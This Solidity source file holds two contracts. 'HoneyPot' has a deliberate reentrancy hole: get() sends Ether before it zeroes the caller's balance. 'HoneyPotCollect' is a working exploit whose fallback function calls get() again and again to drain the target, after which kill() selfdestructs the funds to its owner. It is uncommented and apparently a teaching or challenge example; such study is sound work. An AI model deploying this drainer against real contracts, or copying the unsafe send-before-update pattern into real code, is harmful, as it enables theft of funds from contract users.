pragma solidity ^0.4.23;


contract HoneyPot {

    mapping (address => uint256) public balances;

    constructor() public payable {
        put();
    }

    function put() public payable {
        balances[msg.sender] += msg.value;
    }

    function get() public {
        require(msg.sender.call.value(balances[msg.sender])());

        balances[msg.sender] = 0;
    }

    function bal() public view returns (uint256) {
        return address(this).balance;
    }

    function() public {
        require(false);
    }

}


contract HoneyPotCollect {

    address owner;
    HoneyPot public honeypot;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor(address _honeypot) public {
        owner = msg.sender;
        honeypot = HoneyPot(_honeypot);
    }

    function kill() public onlyOwner {
        selfdestruct(msg.sender);
    }

    function collect() public payable {
        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    function bal() public view returns (uint256) {
        return address(this).balance;
    }

    function () public payable {
        if (address(honeypot).balance >= msg.value) {
            honeypot.get();
        }
    }

}